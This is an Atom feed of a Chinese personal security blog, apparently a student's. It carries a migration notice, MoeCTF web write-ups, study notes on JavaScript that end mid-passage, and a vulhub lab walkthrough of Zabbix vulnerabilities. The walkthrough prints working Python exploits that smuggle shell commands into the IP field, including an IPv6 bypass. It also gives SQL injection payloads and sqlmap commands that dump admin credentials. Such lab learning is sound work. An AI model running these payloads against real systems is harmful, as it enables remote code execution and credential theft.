<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>北歌</title>
  
  
  <link href="https://kinseyy.github.io/atom.xml" rel="self"/>
  
  <link href="https://kinseyy.github.io/"/>
  <updated>2025-08-11T12:27:55.754Z</updated>
  <id>https://kinseyy.github.io/</id>
  
  <author>
    <name>kinsey</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>博客迁移通知</title>
    <link href="https://kinseyy.github.io/2025/08/11/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E9%80%9A%E7%9F%A5/"/>
    <id>https://kinseyy.github.io/2025/08/11/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E9%80%9A%E7%9F%A5/</id>
    <published>2025-08-11T12:13:56.000Z</published>
    <updated>2025-08-11T12:27:55.754Z</updated>
    
    <content type="html"><![CDATA[<p>新博客：<a href="https://kinsey973.top/">https://kinsey973.top</a> ！！！</p><p>博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦</p><span id="more"></span><p>由于本博主心血来潮，想换个博客框架，最后选了新一代静态博客框架valaxy，由云游君开发的，放个<a href="https://valaxy.site/guide/config">链接</a></p><p>从今天起，本博客正式迁移到<a href="https://kinsey973.top,此外,本博客会保留,由于一些语法不兼容问题,本博客的文章就留这了,不迁移过去了(绝对不是我觉得好麻烦),那么就这样吧/">https://kinsey973.top，此外，本博客会保留，由于一些语法不兼容问题，本博客的文章就留这了，不迁移过去了(绝对不是我觉得好麻烦),那么就这样吧</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;新博客：&lt;a href=&quot;https://kinsey973.top/&quot;&gt;https://kinsey973.top&lt;/a&gt; ！！！&lt;/p&gt;
&lt;p&gt;博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦，博客迁移啦&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://kinseyy.github.io/2025/08/11/hello-world/"/>
    <id>https://kinseyy.github.io/2025/08/11/hello-world/</id>
    <published>2025-08-11T11:35:38.400Z</published>
    <updated>2025-08-11T11:35:38.400Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>MoeCTF 2025</title>
    <link href="https://kinseyy.github.io/2025/08/11/MoeCTF-2025/"/>
    <id>https://kinseyy.github.io/2025/08/11/MoeCTF-2025/</id>
    <published>2025-08-11T00:19:59.000Z</published>
    <updated>2025-08-11T01:29:19.909Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="神秘的手镯"><a href="#神秘的手镯" class="headerlink" title="神秘的手镯"></a>神秘的手镯</h3><p>打开页面，提示我们输入万言启封咒</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508110836220.png" alt="image-20250811083623045" loading="lazy"></p><p>但是页面禁止了复制粘贴，我们首先猜测这里使用了js代码禁用了复制粘贴，那么我们将js禁用了就能解决</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508110837309.png" alt="image-20250811083739175" loading="lazy"></p><p>但是禁用了js代码就不能提交了，提交按钮应该也是js代码执行的，那么我们来看看js源码</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508110838081.png" alt="image-20250811083853036" loading="lazy"></p><p>我们在源代码中找到shouzhou.js，查看在验证代码处找到flag</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508110843434.png" alt="image-20250811084325390" loading="lazy"></p><h3 id="初识金曦玄轨"><a href="#初识金曦玄轨" class="headerlink" title="初识金曦玄轨"></a><strong>初识金曦玄轨</strong></h3><p>我们查看源代码，发现一个路由&#x2F;golden_trail</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508110847738.png" alt="image-20250811084704695" loading="lazy"></p><p>我们进去这个路由后提示：路径不正，难窥天道</p><p>我们直接抓个包看看，在响应界面发现flag</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508110848913.png" alt="image-20250811084806849" loading="lazy"></p><h3 id="打上门来！"><a href="#打上门来！" class="headerlink" title="打上门来！"></a><strong>打上门来！</strong></h3><p>输入..&#x2F;..&#x2F;..&#x2F;进行目录穿越，然后找到flag</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508110916330.png" alt="image-20250811091659228" loading="lazy"></p><h3 id="Moe笑传之猜猜爆"><a href="#Moe笑传之猜猜爆" class="headerlink" title="Moe笑传之猜猜爆"></a><strong>Moe笑传之猜猜爆</strong></h3><p>我们在源代码里查看js代码</p><p>在最后一行发现randomNumber 是在前端生成的</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508110920749.png" alt="image-20250811092059697" loading="lazy"></p><p>使用我们直接在控制台输入randomNumber ，就能得到随机数了</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508110921024.png" alt="image-20250811092157951" loading="lazy"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h2&gt;&lt;h3 id=&quot;神秘的手镯&quot;&gt;&lt;a href=&quot;#神秘的手镯&quot; class=&quot;headerlink&quot; title=&quot;神秘的手镯&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://kinseyy.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>vulhub</title>
    <link href="https://kinseyy.github.io/2025/08/06/vulhub/"/>
    <id>https://kinseyy.github.io/2025/08/06/vulhub/</id>
    <published>2025-08-06T00:43:48.000Z</published>
    <updated>2025-08-07T02:15:21.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="zabbix"><a href="#zabbix" class="headerlink" title="zabbix"></a>zabbix</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Zabbix是一种由Alexei Vladishev开发的网络监视和管理系统，采用Server-Client架构，用于监控各种网络服务、服务器和网络设备的状态。它提供了实时监控、报警机制、性能统计和数据可视化等广泛功能。然而，尽管Zabbix具有强大的功能，但在过去曾存在一些安全漏洞。例如，在CVE-2017-2824中，Zabbix的Server端trapper command功能存在一处代码执行漏洞。这个功能允许用户通过Zabbix Server发送命令到Agent端执行。然而，由于修复补丁的缺陷，攻击者可以通过IPv6进行绕过并注入任意命令，导致远程代码执行。</p><h2 id="CVE-2020-11800-Zabbix远程代码执行漏洞"><a href="#CVE-2020-11800-Zabbix远程代码执行漏洞" class="headerlink" title="CVE-2020-11800(Zabbix远程代码执行漏洞)"></a>CVE-2020-11800(Zabbix远程代码执行漏洞)</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Zabbix Server的trapper命令处理，存在命令注入漏洞，可导致远程代码执行。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>版本：Zabbix 3.0.x~3.0.30</p><p>远程代码执行<br>CVSSv3 Score<br>9.0 - CVSS:3.0&#x2F;AV:N&#x2F;AC:H&#x2F;PR:N&#x2F;UI:N&#x2F;S:C&#x2F;C:H&#x2F;I:H&#x2F;A:H<br>AC: HIGH 需要服务端配置开启自动注册，或者Zabbix Proxy（会认证主机名）自动发现。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>该漏洞原理与CVE-2017-2824相同，参考<br><a href="https://talosintelligence.com/reports/TALOS-2017-0325">https://talosintelligence.com/reports/TALOS-2017-0325</a><br>active checks是自动注册的命令字，自动注册的本意是agent可主动将主机注册给server进行监控，在2.2.18版本中可以在IP中注入（参见上文的版本分析处，2.2.19版本才增加了ip校验）shell命令。CVE-2017-2824提到的漏洞在discovery data命令字即自动发现功能中，由于没有校验IP，导致可在IP中写入shell命令，进而在执行script cmd时达到命令注入。<br>比如在IP中写入内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;touch /tmp/zabbix_pwned</span><br></pre></td></tr></table></figure><p>那么执行ping命令时就变为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/ping -c 3 ;<span class="built_in">touch</span> /tmp/zabbix_pwned 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>CVE-2017-2824在3.0.x的修复方式是对IP进行校验<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210106093015-ba412714-4fbe-1.png" alt="img" loading="lazy"><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210106093112-dca2e11c-4fbe-1.png" alt="img" loading="lazy"><br>但是校验IP的方法可以被绕过，Ipv4校验没问题，ipv6校验可绕过:<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210106093148-f1b59720-4fbe-1.png" alt="img" loading="lazy"><br>输入为ffff:::;touch &#x2F;tmp&#x2F;1234pwn即可绕过，进而实现命令注入。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>本漏洞利用需要开启自动注册功能，所以我们使用默认账号&#x2F;密码(admin&#x2F;zabbix)去登录zabbix进行配置</p><p>登录进去长这样</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508060908462.png" alt="image-20250806090834339" loading="lazy"></p><p>我们前往Configuration-&gt;Actions后，选择Auto registration，点击Create action</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508060919614.png" alt="image-20250806091920564" loading="lazy"></p><p>我们随便输入一个名字</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508060919191.png" alt="image-20250806091939146" loading="lazy"></p><p>然后再创建一个Operations，type选择Add host</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508060920728.png" alt="image-20250806092041698" loading="lazy"></p><p>点击add添加，再点击add进行保存，这样我们就配置好了</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508060921151.png" alt="image-20250806092125109" loading="lazy"></p><p>在下载的vulhub中漏洞目录有漏洞利用脚本，查看poc，我们可以看到执行的是写入文件的操作，我们利用python3执行poc，进入docker中查看写入成功</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">ip, data</span>):</span><br><span class="line">    conn = socket.create_connection((ip, <span class="number">10051</span>), <span class="number">10</span>)</span><br><span class="line">    conn.send(json.dumps(data).encode())</span><br><span class="line">    data = conn.recv(<span class="number">2048</span>)</span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(send(target, &#123;<span class="string">&quot;request&quot;</span>:<span class="string">&quot;active checks&quot;</span>,<span class="string">&quot;host&quot;</span>:<span class="string">&quot;vulhub&quot;</span>,<span class="string">&quot;ip&quot;</span>:<span class="string">&quot;ffff:::;touch /tmp/success2&quot;</span>&#125;))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>, <span class="number">10500</span>):</span><br><span class="line">    data = send(target, &#123;<span class="string">&quot;request&quot;</span>:<span class="string">&quot;command&quot;</span>,<span class="string">&quot;scriptid&quot;</span>:<span class="number">1</span>,<span class="string">&quot;hostid&quot;</span>:<span class="built_in">str</span>(i)&#125;)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">and</span> <span class="string">b&#x27;failed&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;hostid: %d&#x27;</span> % i)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><ol><li>导入模块：代码开始时导入了sys、socket和json模块，这些模块用于处理命令行参数、进行网络通信和处理JSON数据。</li><li>send函数：这个函数用于向Zabbix Server发送数据的封装。它使用socket.create_connection建立到目标IP地址和端口10051的连接，然后发送一个JSON格式的数据，并等待响应。最后，它关闭连接并返回响应数据。</li><li>获取目标IP：通过命令行参数获取目标IP地址，这意味着该脚本用于特定的Zabbix Server目标。</li><li>发送数据给Zabbix Server：使用send函数向目标Zabbix Server发送一个JSON请求。这个请求是”active checks”类型的，其中包括主机名和IP地址等参数。这是测试Zabbix系统的活动检查功能。</li><li>循环：在一个hostid范围内，从10000到10500，循环尝试向目标Zabbix Server发送命令请求。这个请求包含了脚本ID和主机ID等参数。</li><li>检查响应数据：如果响应数据不包含”failed”字样，那么打印出hostid和响应数据。这是用于确认命令是否成功执行的部分。</li></ol><p>然后我们执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py 120.46.179.184</span><br></pre></td></tr></table></figure><p>我们就能在&#x2F;tmp&#x2F;下看见一个新创的文件夹</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>检验IP</p><h2 id="CVE-2017-2824"><a href="#CVE-2017-2824" class="headerlink" title="CVE-2017-2824"></a>CVE-2017-2824</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>zabbix 调用script脚本时，没有对IP地址过滤，导致在注册host的数据包中的ip地址后面可以跟分号+命令的方式执行命令。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>zabbix 2.4.x</p><p>zabbix 3.0.x &lt; 3.0.4</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>我们依旧使用账号密码admin&#x2F;zabbix登录后台，然后根据CVE-2020-11800的操作开启自动注册功能</p><p>然后打脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">ip, data</span>):</span><br><span class="line">    conn = socket.create_connection((ip, <span class="number">10051</span>), <span class="number">10</span>)</span><br><span class="line">    conn.send(json.dumps(data).encode())</span><br><span class="line">    data = conn.recv(<span class="number">2048</span>)</span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(send(target, &#123;<span class="string">&quot;request&quot;</span>:<span class="string">&quot;active checks&quot;</span>,<span class="string">&quot;host&quot;</span>:<span class="string">&quot;vulhub&quot;</span>,<span class="string">&quot;ip&quot;</span>:<span class="string">&quot;;touch /tmp/cve-2017-2824&quot;</span>&#125;))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>, <span class="number">10500</span>):</span><br><span class="line">    data = send(target, &#123;<span class="string">&quot;request&quot;</span>:<span class="string">&quot;command&quot;</span>,<span class="string">&quot;scriptid&quot;</span>:<span class="number">1</span>,<span class="string">&quot;hostid&quot;</span>:<span class="built_in">str</span>(i)&#125;)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">and</span> <span class="string">b&#x27;failed&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;hostid: %d&#x27;</span> % i)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><p>然后我们执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py 120.46.179.184</span><br></pre></td></tr></table></figure><p>我们就能在&#x2F;tmp&#x2F;下看见一个新创的文件夹</p><p>（不知道为啥失败率都挺高的）</p><h2 id="CVE-2016-101342-sql注入漏洞复现"><a href="#CVE-2016-101342-sql注入漏洞复现" class="headerlink" title="CVE-2016-101342(sql注入漏洞复现)"></a>CVE-2016-101342(sql注入漏洞复现)</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Zabbix 的latest.php中的toggle idsI或jsrpc.php种的profieldx2参数存在sql注入，通过sql注入获取管理员账户密码，进入后台，进行getshel操作。</p><p>影响版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zabbix 2.0.x| 2.2.x| 2.4.x| 3.0.0-3.0.3</span><br></pre></td></tr></table></figure><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><strong>方法一：存在guest空密码账号，无需登录可爆出漏洞：</strong></p><p>访问页面，无需登录，使用注入语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(0,concat(0xa,user()),0)</span><br></pre></td></tr></table></figure><p>通过报错注入得到用户信息和ip信息</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508070908584.png" alt="image-20250807090812457" loading="lazy"></p><p><strong>方法二：用sqlmap</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查所有库:python3 sqlmap.py -u <span class="string">&quot;http://x.x.x.x:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=*&quot;</span> --dbs查zabbix</span><br><span class="line"></span><br><span class="line">表:python3 sqlmap.py -u <span class="string">&quot;http://x.x.x.x:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=*&quot;</span> -D zabbix --tables</span><br><span class="line"></span><br><span class="line">查<span class="built_in">users</span>列:python3 sqlmap.py -u <span class="string">&quot;http://x.x.x.x:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=*&quot;</span> -D zabbix -T <span class="built_in">users</span> --columns</span><br><span class="line"></span><br><span class="line">查userid,name,passwd数据:python3 sqlmap.py -u <span class="string">&quot;http://x.x.x.x:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=*&quot;</span> -D zabbix -T <span class="built_in">users</span> -C userid,name,passwd --dump</span><br></pre></td></tr></table></figure><p>得到管理员账户和密码</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508070953890.png" alt="image-20250807095335846" loading="lazy"></p><p><strong>方法三：不同的注入页面，使用不同的注入语句</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">latest.php?output=ajax&amp;sid=3f108ab358161a3b&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0)</span><br></pre></td></tr></table></figure><p>（1）使用（<strong>guest&#x2F;空</strong>）登录后，获取下图<strong>zbx_sessionid</strong>的<strong>16</strong>位值：</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508071012835.png" alt="image-20250807101237715" loading="lazy"></p><p>（2）使用下面的语句进行注入查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">latest.php?output=ajax&amp;sid=6f8835e35db2f421&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0)</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508071015747.png" alt="image-20250807101515664" loading="lazy"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;zabbix&quot;&gt;&lt;a href=&quot;#zabbix&quot; class=&quot;headerlink&quot; title=&quot;zabbix&quot;&gt;&lt;/a&gt;zabbix&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="漏洞" scheme="https://kinseyy.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Javaweb</title>
    <link href="https://kinseyy.github.io/2025/07/07/Javaweb/"/>
    <id>https://kinseyy.github.io/2025/07/07/Javaweb/</id>
    <published>2025-07-07T09:54:56.000Z</published>
    <updated>2025-08-11T08:27:01.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Js"><a href="#Js" class="headerlink" title="Js"></a>Js</h3><p>Js用来负责网页行为</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202506071803327.png" alt="image-20250607180345208" loading="lazy"></p><h4 id="引入方式"><a href="#引入方式" class="headerlink" title="引入方式"></a>引入方式</h4><p>内部脚本：将JS代码定义在html界面</p><p>javascript必须在&lt;script&gt;&lt;&#x2F;script&gt;之间</p><p>在html文档中，可以在任意地方，放置任意数量的&lt;script&gt;，一般放在&lt;body&gt;元素的地步，可改善显示速度</p><p>外部脚本：将js代码定义在外部js文件，然后引入到html中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;js/demo .js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="变量-数据类型"><a href="#变量-数据类型" class="headerlink" title="变量&amp;数据类型"></a>变量&amp;数据类型</h4><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>js用let声明变量（弱类型语言）</p><p>js用关键字来声明变量</p><p>输出变量有三种方式：</p><p>1.alert()弹出框形式</p><p>2.console.log()输出到控制台</p><p>3.document.write()输出到body区域</p><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202506241703616.png" alt="image-20250624170312534" loading="lazy"></p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202506241713291.png" alt="image-20250624171351241" loading="lazy"></p><p>字符串反引号用于模版字符串</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p><strong>定义方法一：</strong></p><p>function functionName(参数1，参数2){</p><p>要执行的代码</p><p>}</p><p>注意：形式参数不需要类型，因为javascript是弱类型语言</p><p>返回值也不需要定义类型，可以在函数内部直接是使用return返回即可</p><p>调用：函数名称(实际参数列表)</p><p><strong>定义方法二：</strong></p><p>var functionName&#x3D;function(参数1，参数2){</p><p>&#x2F;&#x2F;执行的代码</p><p>}</p><h4 id="js对象"><a href="#js对象" class="headerlink" title="js对象"></a>js对象</h4><h5 id="array对象"><a href="#array对象" class="headerlink" title="array对象"></a>array对象</h5><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507250928695.png" alt="image-20250725092755610" loading="lazy"></p><p>js中的数组相当于java中的集合，数组长度可变，二js是弱类型，所以可以存储任意类型的数据</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507250939801.png" alt="image-20250725093903765" loading="lazy"></p><p>forEach数组遍历：</p><p>arr.forEach(function(e){</p><p>console.log(e);})</p><p>ES6箭头函数遍历 （。。。）&#x3D;&gt;(…)</p><p>arr.forEach(e)&#x3D;&gt;{</p><p>console.log(e);</p><p>}</p><h5 id="string"><a href="#string" class="headerlink" title="string"></a>string</h5><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507250949620.png" alt="image-20250725094948553" loading="lazy"></p><h5 id="json"><a href="#json" class="headerlink" title="json"></a>json</h5><p><strong>js自定义对象</strong></p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507250951389.png" alt="image-20250725095143347" loading="lazy"></p><p><strong>JSON介绍</strong></p><p>由于其语法简单，层次结构鲜明，现多用于作为数据载体，在网络中进行数据传递</p><p>格式：{“key”:”value”}</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251010047.png" alt="image-20250725101013985" loading="lazy"></p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251010047.png" loading="lazy"></p><h5 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h5><p>概念：BOM是浏览器对象模型，允许js与浏览器对话，js将浏览器的各个组成部分分封装为对象</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251022607.png" alt="image-20250725102254563" loading="lazy"></p><p>Window对象</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251024821.png" alt="image-20250725102434780" loading="lazy"></p><p>Location对象</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251042121.png" alt="image-20250725104228083" loading="lazy"></p><h5 id="DOM对象"><a href="#DOM对象" class="headerlink" title="DOM对象"></a>DOM对象</h5><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251048846.png" alt="image-20250725104826799" loading="lazy"></p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251053321.png" alt="image-20250725105304286" loading="lazy"></p><p>html中Element对象可以通过Document对象获取，二Document对象时通过windows对象获取的</p><p>Document对象中提供了下面获取Element元素对象的函数：</p><p>1.根据id属性值获取，返回単个Element对象</p><figure 